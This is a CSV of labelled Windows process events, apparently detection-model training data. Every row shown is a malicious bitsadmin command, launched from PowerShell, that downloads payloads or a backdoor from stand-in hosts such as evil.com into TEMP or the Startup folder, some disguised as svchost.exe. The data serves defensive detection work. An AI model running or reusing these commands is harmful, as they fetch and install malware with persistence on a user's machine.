event_id,timestamp,process_name,command_line,parent_image,user,integrity_level,label,occurrence_count,weight,hour_of_day,day_of_week,is_weekend,is_business_hours,event_sequence_id,events_in_last_hour,events_in_last_day,parent_is_same,has_unusual_parent,process_path_depth,is_system_path,is_user_path
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3540,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3541,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3542,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3543,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3544,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3545,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.ps1 $env:TEMP\script.ps1 ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,2,0.5,,,0.0,0.0,3546,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.ps1 C:\Users\adity\AppData\Local\Temp\script.ps1 ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,2,0.5,,,0.0,0.0,3547,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3548,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3549,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3550,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3551,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3552,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3553,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3554,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3555,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3556,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3557,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3558,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3559,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3560,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3561,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3562,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3563,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3564,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3565,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3566,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3567,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3568,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3569,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3570,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3571,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3572,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3573,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3574,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3575,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3576,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3577,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3578,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3579,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://malicious.com/payload.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3580,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3581,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3582,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3583,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3584,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3585,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3586,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3587,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3588,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3589,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3590,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3591,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3592,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3593,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3594,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3595,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3596,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3597,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3598,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3599,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3600,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3601,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3602,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3603,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3604,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3605,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3606,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /TRANSFER download https://evil.com/backdoor.exe $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,1,1.0,,,0.0,0.0,3607,0,0,0.0,0.0,3,1.0,0.0
